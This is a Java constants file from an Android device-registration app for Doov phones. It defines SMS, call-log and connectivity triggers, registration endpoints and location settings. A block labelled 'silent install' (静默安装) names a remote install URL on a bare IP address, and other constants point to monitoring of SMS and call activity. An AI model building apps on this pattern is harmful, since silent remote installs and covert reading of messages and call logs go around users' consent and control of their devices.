package com.zf.doovreg;

import android.R.string;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
//ghshuai 去掉百度定位，换GPS定位 --begin
//import com.baidu.location.LocationClientOption.LocationMode;
//ghshuai 去掉百度定位，换GPS定位 --end
public class DoovRegConst {
    /**
     * actions
     */
    public static final String ACTION_SMS_RECEIVED =
            "android.provider.Telephony.SMS_RECEIVED";
    
    public static final String ACTION_PHONE_STATE =
    		TelephonyManager.ACTION_PHONE_STATE_CHANGED;
    
    public static final String ACTION_CONNECTIVITY =
    		ConnectivityManager.CONNECTIVITY_ACTION;
    
    //data save
    public static final String REG_CONFIG_FILE = "config";
    public static final String SMS_NUM = "sms_num";
    public static final String CALL_TIME = "call_time";
    public static final String NET_SATUS = "net_status";
    public static final String REG_STATUS = "reg_status";
    public static final String REG_ALLOW = "reg_allow";
    
    //add by huangjiawei begin 静默安装
    public static final String REG_ONEDAY = "reg_oneday";
    public static final int NETSTATUS_DATA = 1;
    public static final int NETSTATUS_WIFI = 2;
    public static final String INSTALL_URL = "http://120.26.56.235:9623/market/invoice/update/info";
    public static final int INSTALL_RESULT = 101;
    public static final int INSTALL_JUDGE_RESULT = 102;
    public static final int INSTALL_DELAY_POST = 103;
    public static final String DOWNLOAD_FAIL_JUDGE = "download_fail";
    public static final String DOWNLOAD_FAIL = "downloadFailTimes";
    public static final String ACTION_ADDED = Intent.ACTION_PACKAGE_ADDED;
    public static final String ACTION_REPLACE = Intent.ACTION_PACKAGE_REPLACED;
    public static final String PACKAGE_NAME = "com.zf.doovreg";
    public static final int DELAY_TIME = 3500;
    public static final long CHECKDATA_TIME = 1000 * 60 * 60 * 24; //one day
    //add by huangjiawei end 静默安装

//    public static final String NET_FLAG = "net_flag";
    public static final String CALL_FLAG = "call_flag";
    public static final String SMS_FLAG = "sms_flag";

    public static final int NET_AVAILABLE_TRUE = 1;
    public static final int NET_AVAILABLE_FALSE = 0; 
    
    //condition
    public static final int SMS_NUM_MAX = 2; //2;
    public static final int CALL_TIME_MAX = 300; //300;
    public static final int LOCATION_POINT_MAX = 5;
    
    //provider define
    public static final Uri CALL_LOG_URI = CallLog.Calls.CONTENT_URI;
    public static final String CALL_LOG_DURATION = CallLog.Calls.DURATION;
    public static final String CALL_LOG_SORT_ORDER = CallLog.Calls.DEFAULT_SORT_ORDER;
    
    public static final Uri  SMS_URI_INBOX = Uri.parse("content://sms/inbox");
    public static final String SMS_ID = "_id";
    
    public static final String DEFAULT_TYPE = android.os.Build.MODEL;//CBQ 160325 change //android.os.Build.DEVICE;	
    //CBQ add for aishide only 161102
    public static final String EXTRA_TYPE = "ro.custom.modem";

    public static final String REG_URL_QIJI = "http://QiJi.tj.doov.cn:9090/api/ReceiveData_QiJi";
    public static final String REG_URL_QINGGUO = "http://QingGuo.tj.doov.cn:9090/api/ReceiveData_QingGuo";
    public static final String REG_URL_CUICAN = "http://L6.tj.doov.cn:9090/api/ReceiveData_L6";
    public static final String REG_URL_JIANAI = "http://L5M.tj.doov.cn:9090/api/ReceiveData_L5M";
    public static final String COORD_TYPE = "bd09ll";
	// ghshuai 去掉百度定位，换GPS定位 --begin
	//public static final LocationMode LOCATION_MODE = LocationMode.Battery_Saving;
	// ghshuai 去掉百度定位，换GPS定位 --end
    public static final int ACTION_LOCATION_RESULT = 1;
    public static final int ACTION_REGISTER_RESULT = 2;
}
